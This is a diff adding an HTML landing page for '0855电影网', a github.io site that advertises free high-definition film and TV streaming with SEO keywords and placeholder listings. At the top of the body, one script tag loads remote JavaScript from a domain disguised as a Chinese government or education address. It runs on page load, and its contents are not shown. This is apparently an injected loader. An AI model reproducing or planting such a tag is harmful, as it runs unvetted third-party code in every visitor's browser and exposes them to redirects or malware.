@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>0855电影网 - 高清电影在线观看 最新影视资源大全</title>
+<meta name="keywords" content="0855电影网,高清电影,在线观看,最新影视,电影资源,影视大全,免费电影">
+<meta name="description" content="0855电影网（0855dianyingwang-wap.github.io）提供高清电影与最新影视在线观看，涵盖电影、电视剧、综艺、动漫等丰富资源，每日更新，极简数字观影体验。">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#050a14">
+<link rel="canonical" href="https://0855dianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"0855电影网",
+  "url":"https://0855dianyingwang-wap.github.io/",
+  "description":"0855电影网提供高清电影与最新影视在线观看，涵盖电影、电视剧、综艺、动漫等丰富资源，每日更新",
+  "potentialAction":{"@type":"SearchAction","target":"https://0855dianyingwang-wap.github.io/#q={query}","query-input":"required name=query"}
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"SF Mono","JetBrains Mono","PingFang SC","Microsoft YaHei",monospace,sans-serif;
+  background:#050a14;color:#e6edf3;line-height:1.7;overflow-x:hidden;
+  background-image:
+    linear-gradient(rgba(0,191,255,.045) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,191,255,.045) 1px,transparent 1px);
+  background-size:42px 42px;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:root{
+  --cyan:#00bfff;--c2:#00e5ff;--c3:#7df9ff;--deep:#0a1929;--card:#0d1b2a;--line:rgba(0,191,255,.22);
+  --txt:#e6edf3;--mut:#6b8299;--glow:0 0 20px rgba(0,191,255,.45);
+}
+::selection{background:var(--cyan);color:#050a14}
+::-webkit-scrollbar{width:9px;height:8px}
+::-webkit-scrollbar-thumb{background:linear-gradient(var(--cyan),var(--c2));border-radius:4px}
+.hd{position:sticky;top:0;z-index:100;background:rgba(5,10,20,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hd-in{max-width:1400px;margin:0 auto;padding:0 24px;height:72px;display:flex;align-items:center;gap:20px}
+.logo{display:flex;align-items:center;gap:11px;flex-shrink:0}
+.lf{width:44px;height:44px;flex-shrink:0;display:grid;place-items:center;border-radius:8px;background:var(--cyan);color:#050a14;font-weight:900;font-size:15px;font-family:Arial,sans-serif;box-shadow:var(--glow)}
+.logo-n{font-weight:900;font-size:19px;white-space:nowrap;line-height:1.2;font-family:Arial,sans-serif;letter-spacing:.5px}
+.logo-n b{color:var(--c2)}
+.logo-n small{display:block;font-size:9px;color:var(--mut);letter-spacing:2px;font-family:monospace;text-transform:uppercase}
+.search{flex:1;max-width:320px;position:relative}
+.search input{width:100%;height:42px;padding:0 86px 0 16px;border-radius:6px;border:1px solid var(--line);background:rgba(0,191,255,.06);color:var(--txt);font-size:13px;font-family:monospace}
+.search input:focus{border-color:var(--c2);background:rgba(0,191,255,.12)}
+.search .go{position:absolute;right:3px;top:3px;height:36px;padding:0 18px;border-radius:5px;background:var(--cyan);color:#050a14;font-size:12px;font-weight:900;font-family:Arial,sans-serif}
+.nav{display:flex;gap:3px}
+.nav a{padding:8px 14px;font-size:13px;color:var(--mut);font-weight:600;transition:.25s;border-radius:5px;font-family:monospace}
+.nav a:hover,.nav a.on{color:#050a14;background:var(--cyan)}
+.mbtn{display:none;width:44px;height:44px;font-size:21px;flex-shrink:0;color:var(--c2)}
+.mask{position:fixed;inset:0;background:rgba(5,10,20,.96);z-index:150;opacity:0;pointer-events:none;transition:.3s}
+.mask.show{opacity:1;pointer-events:auto}
+.side{position:fixed;top:0;right:-300px;width:280px;height:100%;z-index:200;padding:76px 24px;transition:.4s cubic-bezier(.4,0,.2,1);background:#0a1420;border-left:1px solid var(--line)}
+.side.show{right:0}
+.side a{display:flex;align-items:center;gap:12px;padding:15px 0;border-bottom:1px solid var(--line);font-size:15px;font-family:monospace}
+.side a:hover{color:var(--c2)}
+section{padding:60px 24px}
+.wrap{max-width:1400px;margin:0 auto}
+.sh{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:28px;gap:16px;flex-wrap:wrap}
+.st{display:flex;align-items:center;gap:12px}
+.st .num{font-size:30px;font-weight:900;color:var(--cyan);font-family:Arial,sans-serif;line-height:1;text-shadow:var(--glow)}
+.st h2{font-size:23px;font-weight:900;line-height:1.2;font-family:Arial,sans-serif}
+.st .en{font-size:11px;color:var(--mut);letter-spacing:3px;font-family:monospace;text-transform:uppercase}
+.more{font-size:12px;color:var(--mut);font-weight:600;position:relative;padding-right:18px;font-family:monospace}
+.more::after{content:"→";position:absolute;right:0;top:50%;transform:translateY(-50%);color:var(--c2)}
+.more:hover{color:#fff}
+/* Hero 数字仪表盘 */
+.hero{padding:66px 24px 50px;position:relative;overflow:hidden}
+.hero::before{content:"";position:absolute;width:520px;height:520px;border-radius:50%;background:radial-gradient(circle,rgba(0,191,255,.16),transparent 65%);top:-160px;right:-100px;z-index:0}
+.hb{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:1.1fr 1fr;gap:46px;align-items:center;position:relative;z-index:2}
+.gbig{font-size:clamp(80px,20vw,190px);font-weight:900;line-height:.85;color:var(--cyan);font-family:Arial,sans-serif;text-shadow:var(--glow);letter-spacing:-4px}
+.gbig span{color:var(--mut)}
+.ink h1{font-size:clamp(26px,4.4vw,42px);font-weight:900;line-height:1.45;margin:16px 0 12px;font-family:Arial,sans-serif}
+.ink h1 .g{color:var(--c2)}
+.ink p{color:var(--mut);font-size:14px;max-width:520px;margin-bottom:6px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.hbtns{display:flex;gap:14px;flex-wrap:wrap;margin-top:16px}
+.btn{padding:13px 30px;font-size:14px;font-weight:900;border-radius:5px;transition:.25s;font-family:Arial,sans-serif}
+.b1{background:var(--cyan);color:#050a14;box-shadow:var(--glow)}
+.b1:hover{transform:translateY(-4px);box-shadow:0 14px 34px rgba(0,191,255,.55)}
+.b2{border:1px solid var(--line);color:#fff;background:rgba(0,191,255,.05)}
+.b2:hover{border-color:var(--c2);color:var(--c2)}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;margin-top:24px;background:var(--line);border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.stat{background:var(--card);padding:16px;text-align:center}
+.stat b{display:block;font-size:24px;font-weight:900;color:var(--c2);font-family:Arial,sans-serif;text-shadow:var(--glow)}
+.stat small{font-size:11px;color:var(--mut);font-family:monospace}
+/* 01 精选：横向条带 */
+.strip{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
+.si{position:relative;height:150px;border-radius:6px;overflow:hidden;border:1px solid var(--line);background:var(--bg);transition:.4s;display:flex;flex-direction:column;justify-content:flex-end;padding:18px}
+.si:hover{transform:translateY(-6px);box-shadow:var(--glow);border-color:var(--c2)}
+.si .id{position:absolute;top:12px;left:14px;font-size:12px;color:var(--cyan);font-family:Arial,sans-serif;font-weight:900;z-index:3}
+.si .id::before{content:"#"}
+.si::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(5,10,20,.95) 95%);z-index:1}
+.si>*{position:relative;z-index:2}
+.si h4{font-size:16px;font-weight:900;font-family:Arial,sans-serif}
+.si .mt{font-size:11px;color:var(--c3);font-family:monospace}
+/* 02 分类：流水编号表 */
+.flow{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:0;border:1px solid var(--line);border-radius:6px;overflow:hidden;background:var(--line)}
+.fi{position:relative;height:88px;background:var(--card);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;transition:.3s;border:1px solid transparent}
+.fi:hover{background:rgba(0,191,255,.14);border-color:var(--cyan)}
+.fi i{font-size:19px;font-style:normal}
+.fi b{font-size:13px;font-weight:900;font-family:Arial,sans-serif;letter-spacing:.5px}
+.fi .idx{position:absolute;top:7px;left:9px;font-size:10px;color:var(--mut);font-family:Arial,sans-serif}
+/* 03 榜单：进度条 */
+.rk{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rk-col h3{font-size:14px;font-weight:900;margin-bottom:14px;padding-bottom:9px;border-bottom:1px solid var(--line);color:var(--c2);font-family:monospace}
+.rb{margin-bottom:16px}
+.rb .top{display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;font-family:Arial,sans-serif}
+.rb .top b{font-weight:900}
+.rb .bar{height:7px;border-radius:4px;background:rgba(0,191,255,.12);overflow:hidden}
+.rb .bar i{display:block;height:100%;border-radius:4px;background:linear-gradient(90deg,var(--cyan),var(--c2));box-shadow:var(--glow)}
+/* 04 更新：竖向条带 */
+.lst{display:grid;gap:8px}
+.lr{display:grid;grid-template-columns:90px 1fr auto;align-items:center;gap:18px;padding:13px 18px;border:1px solid var(--line);border-radius:6px;background:var(--card);transition:.3s}
+.lr:hover{border-color:var(--cyan);background:rgba(0,191,255,.1);padding-left:24px}
+.lr .d{font-size:13px;font-weight:900;color:var(--c2);font-family:Arial,sans-serif}
+.lr h4{font-size:14px;font-weight:900;font-family:Arial,sans-serif;line-height:1.5}
+.lr .tp{font-size:10px;color:var(--cyan);font-family:monospace;padding:2px 8px;border:1px solid var(--line);border-radius:3px}
+/* 05 资讯：引号 */
+.news{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.ni{padding:20px 22px;border:1px solid var(--line);border-radius:6px;background:var(--card);transition:.35s;position:relative}
+.ni:hover{border-color:var(--cyan);transform:translateY(-5px);box-shadow:var(--glow)}
+.ni::before{content:"“";position:absolute;top:-8px;right:16px;font-size:52px;color:rgba(0,191,255,.28);font-family:Georgia,serif;line-height:1}
+.ni .cat{font-size:10px;color:var(--c2);font-family:monospace;letter-spacing:1px}
+.ni h4{font-size:14px;font-weight:900;line-height:1.6;margin:6px 0 8px;font-family:Arial,sans-serif}
+.ni small{font-size:11px;color:var(--mut);font-family:monospace}
+.ft{background:#03070d;padding:46px 24px 20px;margin-top:26px;border-top:1px solid var(--line)}
+.ft-w{max-width:1400px;margin:0 auto}
+.ft-t{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:28px}
+.ft-b h3{font-size:21px;font-weight:900;margin-bottom:10px;color:var(--c2);font-family:Arial,sans-serif;letter-spacing:1px}
+.ft-b p{font-size:12px;color:var(--mut);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.ft-c h5{font-size:11px;font-weight:800;margin-bottom:12px;color:var(--c2);font-family:monospace;letter-spacing:2px}
+.ft-c a{display:block;font-size:12px;color:var(--mut);padding:5px 0;font-family:monospace}
+.ft-c a:hover{color:#fff}
+.ft-bot{border-top:1px solid var(--line);padding-top:16px;text-align:center;font-size:11px;color:var(--mut);font-family:monospace}
+.ft-bot .bar{height:2px;border-radius:3px;margin-bottom:12px;background:linear-gradient(90deg,var(--cyan),var(--c2))}
+.ft-bot a{margin:0 9px;color:var(--mut)}
+.ft-bot a:hover{color:#fff}
+.ft-bot p{margin-top:10px;color:var(--mut)}
+.tp{position:fixed;right:20px;bottom:26px;width:44px;height:44px;z-index:90;display:none;align-items:center;justify-content:center;font-size:16px;color:#050a14;border-radius:6px;background:var(--cyan);box-shadow:var(--glow)}
+.tp.show{display:flex}
+@media(max-width:960px){.hb{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
+@media(max-width:680px){.search{display:none}.nav{display:none}.mbtn{display:block}section{padding:38px 16px}.hero{padding:38px 16px 28px}.ft-t,.rk,.news{grid-template-columns:1fr}.lr{grid-template-columns:72px 1fr;gap:12px}.lr .tp{display:none}.gbig{font-size:66px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="hd">
+  <div class="hd-in">
+    <a class="logo" href="#">
+      <span class="lf">0855</span>
+      <span class="logo-n"><b>0855电影网</b><small>0855 MOVIES</small></span>
+    </a>
+    <div class="search"><input type="text" placeholder="搜索电影 / 电视剧 / 综艺 / 动漫..." aria-label="搜索"><button class="go" aria-label="搜索">GO</button></div>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">首页</a><a href="#pick">精选影视</a><a href="#cats">分类浏览</a>
+      <a href="#rank">热播榜单</a><a href="#upd">更新动态</a><a href="#news">影视资讯</a>
+    </nav>
+    <button class="mbtn" id="mbtn" aria-label="菜单">≡</button>
+  </div>
+</header>
+
+<div class="mask" id="mask"></div>
+<aside class="side" id="side">
+  <a href="#home" onclick="closeMenu()">> 网站首页</a>
+  <a href="#pick" onclick="closeMenu()">> 精选影视</a>
+  <a href="#cats" onclick="closeMenu()">> 分类浏览</a>
+  <a href="#rank" onclick="closeMenu()">> 热播榜单</a>
+  <a href="#upd" onclick="closeMenu()">> 更新动态</a>
+  <a href="#news" onclick="closeMenu()">> 影视资讯</a>
+</aside>
+
+<section class="hero" id="home">
+  <div class="hb">
+    <div class="gbig">0855<span>.</span></div>
+    <div class="ink">
+      <h1>0855电影网 · <span class="g">数字观影</span><br>海量影视一站直达</h1>
+      <p>0855电影网（0855dianyingwang-wap.github.io）提供高清电影与最新影视在线观看，涵盖电影、电视剧、综艺、动漫等丰富资源，每日更新，数字极简观影体验。</p>
+      <div class="hbtns">
+        <a class="btn b1" href="#pick">立即观影 ▶</a>
+        <a class="btn b2" href="#cats">分类浏览</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>0855</b><small>网站代号</small></div>
+        <div class="stat"><b>10000+</b><small>影视资源</small></div>
+        <div class="stat"><b>24H</b><small>每日更新</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="pick">
+  <div class="wrap">
+    <div class="sh">
+      <div class="st"><span class="num">01.</span><div><h2>精选影视</h2><span class="en">FEATURED</span></div></div>
+      <a class="more" href="#">更多精选</a>
+    </div>
+    <div class="strip">
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#0d2438,#07121e)"><span class="id">001</span><h4>《追光者》独家上线</h4><div class="mt">剧情 · 悬疑 · 热播</div></a>
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#122c22,#0a1a14)"><span class="id">002</span><h4>《山海谣》首播</h4><div class="mt">古装 · 奇幻</div></a>
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#2a1a26,#160d14)"><span class="id">003</span><h4>《逆风局》更新</h4><div class="mt">犯罪 · 悬疑</div></a>
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#241f12,#14110a)"><span class="id">004</span><h4>《她城》完结篇</h4><div class="mt">都市 · 爱情</div></a>
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#1a2412,#0d1408)"><span class="id">005</span><h4>《归途》热播</h4><div class="mt">战争 · 历史</div></a>
+      <a class="si" href="#" style="--bg:linear-gradient(135deg,#221228,#12091a)"><span class="id">006</span><h4>《异客》新番</h4><div class="mt">科幻 · 惊悚</div></a>
+    </div>
+  </div>
+</section>
+
+<section id="cats">
+  <div class="wrap">
+    <div class="sh">
+      <div class="st"><span class="num">02.</span><div><h2>分类浏览</h2><span class="en">CATEGORIES</span></div></div>
+      <a class="more" href="#">全部分类</a>
+    </div>
+    <div class="flow">
+      <a class="fi" href="#"><span class="idx">01</span><i>🎬</i><b>电影大片</b></a>
+      <a class="fi" href="#"><span class="idx">02</span><i>📺</i><b>热播剧集</b></a>
+      <a class="fi" href="#"><span class="idx">03</span><i>🎭</i><b>综艺娱乐</b></a>
+      <a class="fi" href="#"><span class="idx">04</span><i>🎨</i><b>动漫番剧</b></a>
+      <a class="fi" href="#"><span class="idx">05</span><i>📽️</i><b>纪录片</b></a>
+      <a class="fi" href="#"><span class="idx">06</span><i>🔥</i><b>院线热映</b></a>
+      <a class="fi" href="#"><span class="idx">07</span><i>🎞️</i><b>经典老片</b></a>
+      <a class="fi" href="#"><span class="idx">08</span><i>🌟</i><b>高分推荐</b></a>
+      <a class="fi" href="#"><span class="idx">09</span><i>😂</i><b>喜剧搞笑</b></a>
+      <a class="fi" href="#"><span class="idx">10</span><i>💥</i><b>动作冒险</b></a>
+      <a class="fi" href="#"><span class="idx">11</span><i>👻</i><b>恐怖惊悚</b></a>
+      <a class="fi" href="#"><span class="idx">12</span><i>💕</i><b>青春爱情</b></a>
+    </div>
+  </div>
+</section>
+
+<section id="rank">
+  <div class="wrap">
+    <div class="sh">
+      <div class="st"><span class="num">03.</span><div><h2>热播榜单</h2><span class="en">HOT CHART</span></div></div>
+      <a class="more" href="#">完整榜单</a>
+    </div>
+    <div class="rk">
+      <div class="rk-col">
+        <h3>// 电影榜 TOP5</h3>
+        <div class="rb"><div class="top"><b>追光者</b><span>9.8</span></div><div class="bar"><i style="width:98%"></i></div></div>
+        <div class="rb"><div class="top"><b>逆风局</b><span>9.6</span></div><div class="bar"><i style="width:96%"></i></div></div>
+        <div class="rb"><div class="top"><b>她城</b><span>9.5</span></div><div class="bar"><i style="width:95%"></i></div></div>
+        <div class="rb"><div class="top"><b>归途</b><span>9.4</span></div><div class="bar"><i style="width:94%"></i></div></div>
+        <div class="rb"><div class="top"><b>异客</b><span>9.3</span></div><div class="bar"><i style="width:93%"></i></div></div>
+      </div>
+      <div class="rk-col">
+        <h3>// 剧集榜 TOP5</h3>
+        <div class="rb"><div class="top"><b>山海谣</b><span>9.7</span></div><div class="bar"><i style="width:97%"></i></div></div>
+        <div class="rb"><div class="top"><b>长安十二时辰</b><span>9.6</span></div><div class="bar"><i style="width:96%"></i></div></div>
+        <div class="rb"><div class="top"><b>沉默的真相</b><span>9.5</span></div><div class="bar"><i style="width:95%"></i></div></div>
+        <div class="rb"><div class="top"><b>大江大河</b><span>9.4</span></div><div class="bar"><i style="width:94%"></i></div></div>
+        <div class="rb"><div class="top"><b>庆余年</b><span>9.3</span></div><div class="bar"><i style="width:93%"></i></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="upd">
+  <div class="wrap">
+    <div class="sh">
+      <div class="st"><span class="num">04.</span><div><h2>更新动态</h2><span class="en">LATEST UPDATE</span></div></div>
+      <a class="more" href="#">全部更新</a>
+    </div>
+    <div class="lst">
+      <div class="lr"><div class="d">10.07</div><h4>《追光者》第18集 高清上线</h4><span class="tp">剧情</span></div>
+      <div class="lr"><div class="d">10.06</div><h4>《山海谣》第22集 首播更新</h4><span class="tp">古装</span></div>
+      <div class="lr"><div class="d">10.06</div><h4>《逆风局》第9集 独家上线</h4><span class="tp">犯罪</span></div>
+      <div class="lr"><div class="d">10.05</div><h4>《她城》第30集 完结篇</h4><span class="tp">都市</span></div>
+      <div class="lr"><div class="d">10.05</div><h4>《归途》第12集 热血更新</h4><span class="tp">战争</span></div>
+      <div class="lr"><div class="d">10.04</div><h4>《异客》第6集 烧脑上线</h4><span class="tp">科幻</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sh">
+      <div class="st"><span class="num">05.</span><div><h2>影视资讯</h2><span class="en">LATEST NEWS</span></div></div>
+      <a class="more" href="#">全部资讯</a>
+    </div>
+    <div class="news">
+      <article class="ni"><span class="cat">// 新片速递</span><h4>《追光者》独家上线0855电影网，首日播放破纪录</h4><small>2026.10.07 · 新片速递</small></article>
+      <article class="ni"><span class="cat">// 榜单速报</span><h4>十月热播榜出炉，悬疑题材持续领跑</h4><small>2026.10.06 · 榜单速报</small></article>
+      <article class="ni"><span class="cat">// 专题推荐</span><h4>国庆档专题：主旋律大片集结展映</h4><small>2026.10.05 · 专题推荐</small></article>
+      <article class="ni"><span class="cat">// 影评解读</span><h4>《逆风局》叙事结构深度解析</h4><small>2026.10.04 · 影评解读</small></article>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="ft-w">
+    <div class="ft-t">
+      <div class="ft-b">
+        <h3>0855电影网</h3>
+        <p>0855电影网（0855dianyingwang-wap.github.io）提供高清电影与最新影视在线观看，涵盖电影、电视剧、综艺、动漫等丰富资源，每日更新，数字极简观影体验。</p>
+        <p style="margin-top:8px">官方网站：https://0855dianyingwang-wap.github.io</p>
+      </div>
+      <div class="ft-c">
+        <h5>// 题材分类</h5>
+        <a href="#">电影大片</a><a href="#">热播剧集</a><a href="#">综艺娱乐</a><a href="#">动漫番剧</a><a href="#">纪录片</a>
+      </div>
+      <div class="ft-c">
+        <h5>// 热门栏目</h5>
+        <a href="#home">网站首页</a><a href="#pick">精选影视</a><a href="#cats">分类浏览</a><a href="#rank">热播榜单</a><a href="#upd">更新动态</a><a href="#news">影视资讯</a>
+      </div>
+      <div class="ft-c">
+        <h5>// 关于本站</h5>
+        <a href="#">网站简介</a><a href="#">免责声明</a><a href="#">合作入驻</a><a href="#">意见反馈</a><a href="#">联系我们</a>
+      </div>
+    </div>
+    <div class="ft-bot">
+      <div class="bar"></div>
+      <div><a href="#home">首页</a><a href="#pick">精选</a><a href="#cats">分类</a><a href="#rank">榜单</a><a href="#upd">更新</a><a href="#news">资讯</a></div>
+      <p>© 2026 0855电影网 版权所有 · 高清电影 · 在线观看 · 最新影视 · 影视资源 · 免费观影 · 网址：https://0855dianyingwang-wap.github.io</p>
+    </div>
+  </div>
+</footer>
+
+<button class="tp" id="tpBtn" aria-label="回到顶部">↑</button>
+
+<script>
+var mbtn=document.getElementById('mbtn'),side=document.getElementById('side'),mask=document.getElementById('mask');
+mbtn.addEventListener('click',function(){side.classList.add('show');mask.classList.add('show')});
+mask.addEventListener('click',closeMenu);
+function closeMenu(){side.classList.remove('show');mask.classList.remove('show')}
+var navLinks=document.querySelectorAll('.nav a'),secs=document.querySelectorAll('section[id]'),tpBtn=document.getElementById('tpBtn');
+window.addEventListener('scroll',function(){
+  var sc=document.documentElement.scrollTop||document.body.scrollTop,cur='';
+  secs.forEach(function(s){if(sc>=s.offsetTop-140)cur=s.id});
+  navLinks.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+  tpBtn.classList.toggle('show',sc>500);
+});
+tpBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
